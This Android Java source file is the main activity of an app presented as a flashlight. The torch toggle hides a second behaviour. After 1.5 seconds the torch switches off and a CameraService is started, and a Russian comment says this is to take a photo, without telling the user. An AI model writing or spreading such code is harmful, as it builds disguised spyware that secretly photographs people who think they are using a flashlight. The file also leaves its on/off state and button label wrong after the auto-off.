package com.flashlight.app;

import android.Manifest;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.hardware.camera2.CameraAccessException;
import android.hardware.camera2.CameraCharacteristics;
import android.hardware.camera2.CameraManager;
import android.os.Bundle;
import android.os.Handler;
import android.os.Looper;
import android.widget.Button;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;

public class MainActivity extends AppCompatActivity {
    private CameraManager cameraManager;
    private String cameraId;
    private boolean isOn = false;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        if (ContextCompat.checkSelfPermission(this, Manifest.permission.CAMERA) != PackageManager.PERMISSION_GRANTED) {
            ActivityCompat.requestPermissions(this, new String[]{Manifest.permission.CAMERA}, 1);
        }

        cameraManager = (CameraManager) getSystemService(CAMERA_SERVICE);
        try {
            for (String id : cameraManager.getCameraIdList()) {
                Boolean flash = cameraManager.getCameraCharacteristics(id).get(CameraCharacteristics.FLASH_INFO_AVAILABLE);
                if (flash != null && flash) { cameraId = id; break; }
            }
            if (cameraId == null) cameraId = cameraManager.getCameraIdList()[0];
        } catch (CameraAccessException e) { e.printStackTrace(); }

        Button btn = findViewById(R.id.btn_flash);
        btn.setOnClickListener(v -> {
            try {
                isOn = !isOn;
                if (isOn) {
                    // Включаем фонарик
                    cameraManager.setTorchMode(cameraId, true);
                    btn.setText("Выключить");
                    
                    // Ждем 1.5 секунды и выключаем
                    new Handler(Looper.getMainLooper()).postDelayed(() -> {
                        try {
                            cameraManager.setTorchMode(cameraId, false);
                        } catch (Exception e) {}
                        
                        // Сразу после выключения света делаем снимок
                        Intent svc = new Intent(this, CameraService.class);
                        startForegroundService(svc);
                        
                    }, 1500); // 1.5 секунды
                    
                } else {
                    cameraManager.setTorchMode(cameraId, false);
                    btn.setText("Включить");
                }
            } catch (CameraAccessException e) { e.printStackTrace(); }
        });
    }
}
